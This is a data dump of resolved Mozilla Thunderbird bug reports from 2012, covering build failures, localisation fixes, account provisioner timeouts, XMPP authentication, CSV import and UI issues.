813295%TAB%1353328461%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Fix entity names for keyboard shortcuts for compose window font size changes after bug 738194%TAB%Fix entity names for keyboard shortcuts for compose window font size changes after bug 738194+++ This bug was initially created as a clone of Bug #738194 comment 48 +++   Gion-Andri Cantieni 2012-11-18 10:59:44 CET  If you change the content of 'decreaseFontSize.key', 'increaseFontSize.key' and 'increaseFontSize.key2' in b/editor/ui/locales/en-US/chrome/composer/editorOverlay.dtd, you should also change the entity names. Otherwise, some localizers won't find this changes.
812992%TAB%1353282886%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%ACCEPTED_MAR_CHANNEL_IDS and MAR_CHANNEL_ID not updated for Firefox in mozilla-esr17,ACCEPTED_MAR_CHANNEL_IDS and MAR_CHANNEL_ID not updated for Thunderbird in mozilla-esr17%TAB%ACCEPTED_MAR_CHANNEL_IDS and MAR_CHANNEL_ID not updated for Firefox in mozilla-esr17,ACCEPTED_MAR_CHANNEL_IDS and MAR_CHANNEL_ID not updated for Thunderbird in mozilla-esr17+++ This bug was initially created as a clone of Bug #812989 +++  Through having forgot to do this on Thunderbird, I realised that these two variables in confvars.sh haven't been updated:  ACCEPTED_MAR_CHANNEL_IDS=firefox-mozilla-beta,firefox-mozilla-release MAR_CHANNEL_ID=firefox-mozilla-beta  I'm not 100% sure on the effects, but I believe this means that Firefox ESR could mistakenly accept the wrong snippets and get updated to a mainstream based release.
812630%TAB%1353070732%TAB%352356%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%When hovering over the Menu Button, hover text is: "Displays the Application Menu"%TAB%When hovering over the Menu Button, hover text is: "Displays the Application Menu"IRC :bwinton suggested this hover text is wrong. Perhaps it should be "Display the Thunderbird menu" or some such?
812246%TAB%1352973553%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Build bustage - error: nsMsgRDFDataSource.h - invalid use of member 'nsMsgRDFDataSource::mObservers' in static member function%TAB%Build bustage - error: nsMsgRDFDataSource.h - invalid use of member 'nsMsgRDFDataSource::mObservers' in static member functionSeeing this across the board:  ../../../../mailnews/base/src/nsMsgRDFDataSource.h: In static member function 'static nsresult nsMsgRDFDataSource::cycleCollection::UnlinkImpl(void*)': ../../../../mailnews/base/src/nsMsgRDFDataSource.h:64:30: error: invalid use of member 'nsMsgRDFDataSource::mObservers' in static member function ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:67:46: error: from this location ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:67:56: error: 'NS_IMPL_CYCLE_COLLECTION_UNLINK_NSCOMARRAY' was not declared in this scope ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:68:3: error: expected ';' before 'NS_IMPL_CYCLE_COLLECTION_UNLINK_NSCOMPTR' ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:66:89: warning: unused variable 'tmp' ../../../../mailnews/base/src/nsMsgRDFDataSource.h: In static member function 'static nsresult nsMsgRDFDataSource::cycleCollection::TraverseImpl(nsMsgRDFDataSource::cycleCollection*, void*, nsCycleCollectionTraversalCallback&)': ../../../../mailnews/base/src/nsMsgRDFDataSource.h:64:30: error: invalid use of member 'nsMsgRDFDataSource::mObservers' in static member function ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:73:48: error: from this location ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:73:58: error: 'NS_IMPL_CYCLE_COLLECTION_TRAVERSE_NSCOMARRAY' was not declared in this scope ../../../../mailnews/base/src/nsMsgRDFDataSource.cpp:74:3: error: expected ';' before 'NS_IMPL_CYCLE_COLLECTION_TRAVERSE_NSCOMPTR' make[8]: *** [nsMsgRDFDataSource.o] Error 1  Hrm, so while bug 806279 touched NS_IMP_CYCLE_COLLECTION_UNLINK_NSCOMARRAY, it deprecated the macro instead of tearing it outright...so, in theory, it *is* supposed to still work.  Waiting for my build to "finish", and then I'll dig into this.
812130%TAB%1352946484%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Increase the account provisioner timeout to greater than the server timeout%TAB%Increase the account provisioner timeout to greater than the server timeoutThe account provisioner timeout on individual providers is 10 seconds (run in async mode), but the server timeout is also 10 seconds.  We should increase Thunderbird's timeout slightly, to say 11 seconds, or maybe just 15 to ensure that even in a timeout situation, Thunderbird will still receive and display results for providers that haven't timed out (as realised in bug 812101).
812126%TAB%1352944472%TAB%32503%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Mail Window Front End%TAB%(unintentionally) double clicking on attachment runs two concurrent "save" task  and corrupts the saved file.%TAB%(unintentionally) double clicking on attachment runs two concurrent "save" task  and corrupts the saved file.When I try to save an attachment to a message in thunderbird, either by mistake or mishandling of a pointing device, I essentially double clicks on the attachment where, it seems, a single mouse click is enough.  Problem is that this two clicks caused by "double-click" seems to run TWO (2) "save" threads concurrently (there does not seem to be a lock to serialize this), and as a result, while the saving of the first may start or even about to finish, the second thread may interfere, ESPECIALLY when a group of attachments are to be saved, and I don't realize that the second dialog I am about to click is the FIRST window of the SECOND thread to save an already saved (or its saving is in operation) attachment.  If I click on this second dialog, then I mess up the saving process. The typical symptom is that   - TB says something about it is not able to read the original source of the    copy (I am using Japanese locale and not sure what the corresponding English message is), but the meaning of the message is very obscure: why on earth TB    can not read the ATTACHMENT already in its folder(?!).   - The two threads somehow does not cause the first obnoxious mysterious message     to appear, but they either    - leaves corrupted attachment file, or    - more likely it leaves ATTACHMENT-SAVED-FILENAME.part temporary file behind      (note the ".part" suffix) and      often I find 0-sized ATTACHMENT-SAVED-FILENAME.  It has shown up a few version before and not sure when exactly. But maybe within a last year(?)  Double-clicking is often done by mistake and this behavior of thunderbird saving feature is very obnoxious.  There ought to be a serialization mechanism so that another thread does not stomp on the already running saving operation of an attachment.
812101%TAB%1352935707%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Account provisioner: First search with both Gandi & Hover checked, fails most of the time%TAB%Account provisioner: First search with both Gandi & Hover checked, fails most of the timeSTR: - Search for an email address with totobimbo, with Gandi & Hover checked: failure (most of the time) at first search.  - Deselect one of the providers and run search again: successful (even if Gandi results are broken - they seem to be expecting 2 words search query and use the second for the domain name ) - Reselect the previously deselected provider and run the search again: success  I worked through this with Sancus this morning. We reduced it down to one main issue, and one minor issue that we want to follow-up on as well (plus one issue already fixed):  * The main issue is that the account provisioning providers are being talked to in an synchronous fashion. At the moment, hover is taking about 7.5 - 8.5 seconds to respond, gandi is between 1 - 4 seconds.  Thunderbird has a built in timeout of 10 seconds.  Hence, there are various times when we're taking up to about 11/12 seconds to get a result, and so Thunderbird is timing out. I'm guessing about 30 - 50% of the time we could be getting timeouts at the moment. We have no history here, so we don't know how long we've been in this state.  Sancus is planning on changing broker-live to run the providers as async (something that was originally intended), so once that is done, we should be a lot less likely to time out.  * The minor issue, is that broker-live also has a 10 second timeout on individual results, given that Thunderbird also has 10 seconds, that leaves no time for actual processing in the server picks up the timeout case, i.e. we could be in the state where a provider has timed out, but another provider has returned the results which broker-live would return, but Thunderbird would itself have timed out leaving the user with no results.  The simple fix here is to bump Thunderbird's timeout a little, so that it exceeds broker-live's timeout.  Given the times we're seeing for results to be returned on individual providers, I don't think we need to push this tweak out quick for 17.0, we can include it in the next round of security releases, as an worst case improvement.  * The fixed issue is that when requesting results for only one provider, broker-live was still asking both/all providers (in the synchronous fashion as mentioned above).  This is now fixed on broker-live and, for instance, we're generally seeing 1-3 seconds on results from Gandi where it was around 10 seconds (and sometimes timing out) before.    So at the moment, searches on individual providers should now return results all of the time, and searches on both providers may time out - but Sancus will look at fixing that later today.
811920%TAB%1352900715%TAB%436993%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Message list highlight bar - insufficient contrast when list is blurred%TAB%Message list highlight bar - insufficient contrast when list is blurredObserved on Ubuntu 12.04LTS  STR: 1. Select an email in the message list 2. Click on the message preview pane to de-focus the message list  Observed behaviour: Message bar was formerly white-on-orange, but fades to black-on-grey that nearly matches the striping used in the message list, making it nearly impossible to quickly identify which message (e.g. in a thread) is being looked at.  Expected behaviour: The message highlight bar should remain obviously different from the stripes.  The inactive highlight bar has the same color as on Nautilus. The only solution I'm seeing is to remove the zebra striping like already done on Windows (Nautilus uses also no zebra striping).  Andreas, what do you think about removing the zebra stripes?
810573%TAB%1352510738%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Port Bug 737786 to comm-central - Switch from :-moz-placeholder to ::-moz-placeholder (pseudo-class to pseudo-element)%TAB%Port Bug 737786 to comm-central - Switch from :-moz-placeholder to ::-moz-placeholder (pseudo-class to pseudo-element)Firefox changed the -moz-placeholder from pseudo-class to pseudo-element. We should follow this decision.
810330%TAB%1352444468%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Port Bio 1772 - IRC account disconnects on receiving action messages containing line breaks%TAB%Port Bio 1772 - IRC account disconnects on receiving action messages containing line breaksPort Bio 1772 - IRC account disconnects on receiving action messages containing line breaks  Filing a BMO bug to request approval on the patch. I think we want to take this patch for Thunderbird 17.  Approval request comments: - limited risk: very trivial change, replacing . with [\s\S] in a regexp to also match the \n character. - Unit test included in the patch. - impact: possible security issue if this bug is abused (it's possible to trigger this bug remotely to cause an IRC account connected with Thunderbird to be disconnected.)
809853%TAB%1352353058%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Nightly on Mac is broken,Thunderbird Nightly on Mac and Linux is broken (doesn't start - Couldn't load XPCOM)%TAB%Nightly on Mac is broken,Thunderbird Nightly on Mac and Linux is broken (doesn't start - Couldn't load XPCOM)This is what I get When I start it from the Terminal :  Oulan:~ ludo$ /Applications/Daily.app/Contents/MacOS/thunderbird XPCOMGlueLoad error 4:0 for file /Applications/Daily.app/Contents/MacOS/libxpcom.dylib: Library not loaded: @executable_path/libsoundtouch.dylib   Referenced from: /Applications/Daily.app/Contents/MacOS/XUL   Reason: image not found Couldn't load XPCOM.
809573%TAB%1352286889%TAB%101158%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%opening attached .eml file triggers TypeError: msgHdr.folder is null%TAB%opening attached .eml file triggers TypeError: msgHdr.folder is nullOpening an attached .eml file triggers this error in the console: (opening one from file doesn't trigger it)  Error: TypeError: msgHdr.folder is null Source File: chrome://messenger/content/mailWindowOverlay.js Line: 3074
808172%TAB%1351859943%TAB%101158%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%convert Mutation Events to use MutationObserver in mail/%TAB%convert Mutation Events to use MutationObserver in mail/Check the error console. You'll see a warning  Warning: Use of Mutation Events is deprecated. Use MutationObserver instead. Source File: chrome://messenger/content/msgMail3PaneWindow.js Line: 944  This patch get rid of the mutation events, should be a small perf win. I didn't touch the im/ parts, at least yet.  The _setMenuitemAttributes method is (almost) copy-pasted from firefox.  (Firefox doesn't yes use a mutationobserver in tabbrowser.xml looks like they manually call a method to produce TabAttrModified events which looks tedious.)
807787%TAB%1351773268%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Folder on linux wastes awful amount of horizontal space,Folder pane (tree widget) on linux wastes horizontal space%TAB%Folder on linux wastes awful amount of horizontal space,Folder pane (tree widget) on linux wastes horizontal space(I was sure I filed this a year ago but apparently I forgot to do it -- I'm feeling the pain now that I'll be running without my 24'' monitor for a few weeks).  Approximately a year ago, Thunderbird started using a whole lot more horizontal space for its folder tree, namely around the icon and left of the label. I'm attaching two screenshots for comparison.  I'm using a vertical layout on a 1600x1050 screen, so this kinda wastes space, both in the folder list and the thread pane (thread triangles waste the same amount of space).
807629%TAB%1351747009%TAB%277998%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Toolbars and Tabs%TAB%Appmenu stays open after menu item selection%TAB%Appmenu stays open after menu item selectionUser Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Zune 4.7)  Steps to reproduce:  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/19.0 Thunderbird/19.0a1 (01 November 2012 build)  When you open the appmenu, and then choose one of the menu items, the action is completed, and the menu stays open.   Actual results:  I selected the menu item Options... and the options dialog opened.  When I closed the options dialog, the appmenu opened again.  When I selected the New Message menu item, the compose window opened, but the appmenu remained open.   Expected results:  The appmenu should not reopen after dismissing the options dialog or after choosing any other menu item.
807592%TAB%1351735501%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Frequent red on builders: error RC2135 : file not found: address-book.ico%TAB%Frequent red on builders: error RC2135 : file not found: address-book.icoThis failure is frequently turning the Windows builders red, I think someone had originally proposed a fix for it, but I'm not sure it went anywhere. We should try and fix this if we can:  nsMailApp.cpp e:\builds\moz2_slave\tb-c-cen-w32-dbg\build\config\rules.mk:1195:0$ e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/_virtualenv/Scripts/python.exe -O e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/build/cl.py cl -FonsMailApp.obj -c   -DMOZ_SOURCE_STAMP="8285f35f9fd5" -DMOZ_SOURCE_REPO="http://hg.mozilla.org/comm-central" -DMOZILLA_OFFICIAL -DAB_CD=en-US -DAPP_VERSION="19.0a1" -DTHUNDERBIRD_ICO=\"../../mozilla/dist/branding/thunderbird.ico\" -DGRE_MILESTONE=19.0a1 -DGRE_BUILDID=20121101003454  -DXPCOM_GLUE -DMOZ_THUNDERBIRD=1 -DOSTYPE=\"WINNT6.1\" -DOSARCH=WINNT -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/toolkit/xre -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/xpcom/base -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/xpcom/build  -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app -I. -I../../mozilla/dist/include -I../../mozilla/dist/include/nsprpub  -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mozilla/dist/include/nspr -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mozilla/dist/include/nss        -TP -nologo -W3 -Gy -Fdgenerated.pdb -wd4800 -GR-  -DDEBUG -D_DEBUG -DTRACING -Zi -O1 -Oy- -MDd           -FI ../../comm-config.h -DMOZILLA_CLIENT e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app/nsMailApp.cpp e:\builds\moz2_slave\tb-c-cen-w32-dbg\build\config\version.mk:49:0$ /bin/sh /e/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/build/msys-perl-wrapper e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/config/version_win.pl -QUIET 1 -DEPTH ../../mozilla -TOPSRCDIR e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla -OBJDIR . -SRCDIR e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app -DISPNAME Daily -APPVERSION 19.0a1 -OFFICIAL 1 -DEBUG 1 -BINARY thunderbird.exe -RCINCLUDE e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app/splash.rc e:\builds\moz2_slave\tb-c-cen-w32-dbg\build\objdir-tb\mail\app\Makefile:102:0$ e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/_virtualenv/Scripts/python.exe e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/config/pythonpath.py -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/build/pypng e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/build/png2ico.py e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/themes/qute/mail/icons/mail-toolbar-aero.png 37 1 16 address-book.ico Creating Resource file: module.res e:\builds\moz2_slave\tb-c-cen-w32-dbg\build\config\rules.mk:1237:0$ rc.exe  -DMOZ_THUNDERBIRD -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app -r -DMOZ_SOURCE_STAMP="8285f35f9fd5" -DMOZ_SOURCE_REPO="http://hg.mozilla.org/comm-central" -DMOZILLA_OFFICIAL -DAB_CD=en-US -DAPP_VERSION="19.0a1" -DTHUNDERBIRD_ICO=\"../../mozilla/dist/branding/thunderbird.ico\" -DGRE_MILESTONE=19.0a1 -DGRE_BUILDID=20121101003454  -DXPCOM_GLUE -DMOZ_THUNDERBIRD=1 -DOSTYPE=\"WINNT6.1\" -DOSARCH=WINNT -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/toolkit/xre -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/xpcom/base -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/xpcom/build  -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app -I. -I../../mozilla/dist/include -I../../mozilla/dist/include/nsprpub  -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mozilla/dist/include/nspr -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mozilla/dist/include/nss     -Fomodule.res e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mail/app/module.rc Microsoft (R) Windows (R) Resource Compiler Version 6.1.7600.16385  Copyright (C) Microsoft Corporation.  All rights reserved.    e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mail/app/module.rc(40) : error RC2135 : file not found: address-book.ico  e:\builds\moz2_slave\tb-c-cen-w32-dbg\build\config\rules.mk:1237:0: command 'rc.exe  -DMOZ_THUNDERBIRD -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app -r -DMOZ_SOURCE_STAMP="8285f35f9fd5" -DMOZ_SOURCE_REPO="http://hg.mozilla.org/comm-central" -DMOZILLA_OFFICIAL -DAB_CD=en-US -DAPP_VERSION="19.0a1" -DTHUNDERBIRD_ICO=\"../../mozilla/dist/branding/thunderbird.ico\" -DGRE_MILESTONE=19.0a1 -DGRE_BUILDID=20121101003454  -DXPCOM_GLUE -DMOZ_THUNDERBIRD=1 -DOSTYPE=\"WINNT6.1\" -DOSARCH=WINNT -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/toolkit/xre -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/xpcom/base -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mozilla/xpcom/build  -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/mail/app -I. -I../../mozilla/dist/include -I../../mozilla/dist/include/nsprpub  -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mozilla/dist/include/nspr -Ie:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mozilla/dist/include/nss     -Fomodule.res e:/builds/moz2_slave/tb-c-cen-w32-dbg/build/objdir-tb/mail/app/module.rc' failed, return code 1 <thunderbird.exe>: Found error
807303%TAB%1351665562%TAB%278074%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Unprefix "-moz-initial" in comm-central%TAB%Unprefix "-moz-initial" in comm-centralWe now support the unprefixed form of the CSS "initial" keyword.  "-moz-initial" remains as an alias, but we'll drop it at some point.  Filing this bug on doing s/-moz-initial/initial/ in comm-central code. This patch changes also -moz-initial in suite. For this I set the feedback to neil.  I hope this is okay, there are only three changes in suite.
806581%TAB%1351519116%TAB%451845%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Translate Facebook Chat%TAB%Translate Facebook ChatCreate a new chat account.   Facebook chat is not a proper name, it has a Swedish translation. The name is hardcoded in file http://mxr.mozilla.org/comm-central/source/chat/protocols/facebook/facebook.js#49
806575%TAB%1351518441%TAB%451845%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Installer%TAB%Maintenance Service label cut-off%TAB%Maintenance Service label cut-offUser Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET4.0C; .NET4.0E)  Steps to reproduce:  Custom installation of Tb in sv-SE.   Actual results:  Maintenance Service label 'OPTIONAL_COMPONENTS_DESC' for locales with longer text than en-US text to have the text cut-off. Similar bug in Firefox https://bugzilla.mozilla.org/show_bug.cgi?id=745426   Expected results:  Extend label.
806228%TAB%1351425900%TAB%450069%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Untriaged,Instant Messaging%TAB%IM does not detect that XMPP server does not support SASL,Fix login to XMPP servers that implement XMPP v1.0, don't support SASL, but advertise iq-auth support (eg. fastmail)%TAB%IM does not detect that XMPP server does not support SASL,Fix login to XMPP servers that implement XMPP v1.0, don't support SASL, but advertise iq-auth support (eg. fastmail)User Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010231231  Steps to reproduce:  This is a fork of Bug 789745. The following case seems to not be covered by the detection mechanism implemented as a fix to that bug.  1. Created an XMPP account with chat.messagingengine.com:5222 (a server without SASL support). 2. Attempted to connect.  Server details: [1] http://fastmail.wikia.com/wiki/ChatService [2] http://blog.fastmail.fm/2012/09/26/one-step-forward-two-steps-back/    Actual results:  The connection failed with "No authentication mechanism offered by the server". The debug log is attached.   Expected results:  Thunderbird IM should have detected that this server does not support SASL and fallen back to legacy authentication.  This should be all we need to change to fix this. I haven't tested this at all, so not requesting review yet. Feedback welcome of course :).  The relevant specs are: http://xmpp.org/rfcs/rfc3920.html#sasl "If the receiving entity is capable of SASL negotiation, it MUST advertise one or more authentication mechanisms within a <mechanisms/> element qualified by the 'urn:ietf:params:xml:ns:xmpp-sasl' namespace in reply to the opening stream tag received from the initiating entity (if the opening stream tag included the 'version' attribute set to a value of at least "1.0")."  and http://xmpp.org/extensions/xep-0078.html#streamfeature "It may be desirable for a server to advertise support for non-SASL authentication as a stream feature. The namespace for reporting support within <stream:features/> is "http://jabber.org/features/iq-auth". Upon receiving a stream header qualified by the 'jabber:client' namespace, a server that returns stream features SHOULD also announce support for non-SASL authentication by including the relevant stream feature."
805953%TAB%1351251599%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%create a shared function to determine account tree row to click for account manager test files, instead of each test hardcoding its own assumptions%TAB%create a shared function to determine account tree row to click for account manager test files, instead of each test hardcoding its own assumptionsAs seen in bug 749200, some tests in mail/test/mozmill/account do not properly determine which row to click in the account manager tree. They use hardcoded values or depend on account order or have assumptions that may not be met after future changes.  In this bug I propose to move the function test-archive-options.js::get_account_tree_row() into mail/test/mozmill/shared-modules/test-account-manager-helpers.js and make use of it in all of the mail/test/mozmill/account tests. They already import this module. While they do not fail now, they may break anytime in the future. So I propose to make them more robust beforehand.
805826%TAB%1351234665%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%FileLink%TAB%Change Box.com serviceURL to point to 25GB promotional page%TAB%Change Box.com serviceURL to point to 25GB promotional pageFor Box.com Filelinks, we'd like the icon and link to Box to take users to the 25GB promotional page. Brian - do you think you could give this a shot? Trivial fix - basically, just update the serviceURL for nsBox.js to point to https://www.box.com/thunderbird  I can review that for you lickity split.
805185%TAB%1351080967%TAB%454725%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Untriaged,Backend,Mail Window Front End%TAB%updated  17 = WIN 7 problems--opens double windows. Redundant Message,updated  17 = WIN 7 problems--opens double windows. Redundant Message (regression by bug 755793),updated  17 = WIN 7 problems--opens double windows. (Regression by bug 755793. Once Tb is terminated with multiple windows opened, multiple windows are always opened upon restart, because X button closes all windows.),updated  17 = WIN 7 problems--opens double windows. (Regression by bug 755793. Once Tb is terminated with multiple windows opened, multiple windows are always opened from sessions.json upon restart, because X button always closes all windows.)%TAB%updated  17 = WIN 7 problems--opens double windows. Redundant Message,updated  17 = WIN 7 problems--opens double windows. Redundant Message (regression by bug 755793),updated  17 = WIN 7 problems--opens double windows. (Regression by bug 755793. Once Tb is terminated with multiple windows opened, multiple windows are always opened upon restart, because X button closes all windows.),updated  17 = WIN 7 problems--opens double windows. (Regression by bug 755793. Once Tb is terminated with multiple windows opened, multiple windows are always opened from sessions.json upon restart, because X button always closes all windows.)My problem not fully listed by other people's BUG IDs  shown on many Bug lists  updated  17 = WIN 7 problems--opens double windows. Redundant Message   My Virtual XP in 17 Beta  has no problems.     BUT!! 1)WIN 7 opens 2 panes of tb --close one the other closes also.     ...with...   2)a pop up Notice "THIS FOLDER IS BEING PROCESSES.PLEASE WAIT UNTIL PROCESSING IS COMPLETE TO GET MESSAGES"--this is a redundant message as it happens on all openings.      3, Missing blue back ground  and  4, moving TB windows is not always responsive.... but 5, ??? I think it allows me to have diff. TB files open and work in both---  6 QUESTION --Is this ability to work in two panes meant to happen or a fluke?
804598%TAB%1350972495%TAB%107247%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Security,Preferences%TAB%Can not remove individual cookie%TAB%Can not remove individual cookieUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010144125  Steps to reproduce:  1.  Open 'Cookie' dialog (Options\Security\Web Content\Show Cookies). 2.  Click a cookie need to be removed. 3.  Click 'Remove Cookie' button.   Actual results:  Nothing happens.   Expected results:  The selected cookie should be removed.
804001%TAB%1350810555%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%The "Check now" button in advanced preferences should be "Check now..." after bug 595723%TAB%The "Check now" button in advanced preferences should be "Check now..." after bug 595723In bug 595723 we made the System integration dialog to appear unconditionally after clicking "Check now" in preferences. Because of that the button should be renamed to "Check now..." according to current style.
803916%TAB%1350742298%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Filters%TAB%filterHeader.label label in filterListDialog no longer wraps after bug 450302%TAB%filterHeader.label label in filterListDialog no longer wraps after bug 450302In bug 450302 this change was made to the label containing &filterHeader.label; : -        <label control="filterTree">&filterHeader.label;</label> +        <hbox> +          <label id="filterListLabel" control="filterList" value="&filterHeader.label;" crop="end" flex="1"></label> +          <label id="countBox"/> +        </hbox>  Thus, it no longer wraps if the dialog is too small. That is also exaggerated by the fact that the countBox label occupies the same grid cell and may force the filterHeader.label to be cropped if there are many filters (i.e. the countbox label has a long string).  This may have a bigger impact on languages that have that string longer than the en-US locale.
803835%TAB%1350708959%TAB%454427%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Untriaged,Address Book%TAB%Address Book import of CSV files messes up on quoted fields%TAB%Address Book import of CSV files messes up on quoted fieldsUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010144125  Steps to reproduce:  I've attempted to import a simple CSV file into the Address Book.  The file is attached.   Actual results:  The record was imported, but the fields were not properly extracted from their quoted format in the file.  For example, instead of getting:  Acer America  ...this was imported:  "Acer Americ    Expected results:  Quoted fields should not be mangled on import.
803811%TAB%1350694885%TAB%372329%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%--with-system-zlib version detection broken after bug 781446%TAB%--with-system-zlib version detection broken after bug 781446After http://hg.mozilla.org/comm-central/rev/00c391e2f48c (now in tb 17.0b1), build with --system-zlib fails to correctly detect the version.  $grep VERNUM /usr/include/zlib.h                                                      #define ZLIB_VERNUM 0x1230  MOZZLIB is also 0x1230.  the MOZZLIBNUM check does  $echo 0x1230 | awk -F. '{printf "0x%x\n", ((($1 * 16 + $2) * 16) + $3) * 16 + $4}' 0x1230000  which fails the configure test - if the version is MOZZLIB=1.2.3, the test succeeds  $echo 1.2.3 | awk -F. '{printf "0x%x\n", ((($1 * 16 + $2) * 16) + $3) * 16 + $4}'   0x1230  So, either MOZZLIB should be fixed in configure.in (like it was in mozilla/configure.in for a short period of time) or bug #763651 should be ported (since it adds a MOZ_ZLIB_CHECK macro)  So, which way should it be fixed (in c-c, c-a, c-b) ?
803724%TAB%1350654424%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%[OS X] Text of some toolbar icons are not lined up%TAB%[OS X] Text of some toolbar icons are not lined upIn the monochrom toolbar on OS X, the text of some toolbar icons is a bit too far up. In the Screenshot its the button for Chat and File.
802704%TAB%1350463304%TAB%232883%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%[OS X] add LSApplicationCategoryType to the info.plist%TAB%[OS X] add LSApplicationCategoryType to the info.plist+++ This bug was initially created as a clone of Bug #714716 +++  I couldn't find the related bug for Thunderbird. Just add the following 2 lines to Info.plist:  <key>LSApplicationCategoryType</key> <string>public.app-category.productivity</string>
802575%TAB%1350449172%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Instant Messaging%TAB%AppMenu button doesn't get added to Chat tab automatically%TAB%AppMenu button doesn't get added to Chat tab automaticallyI just noticed that even though bug 785692 landed, we didn't migrate the AppMenu button onto the chat tab.  We should do that.  I'll try to come up with a patch today.
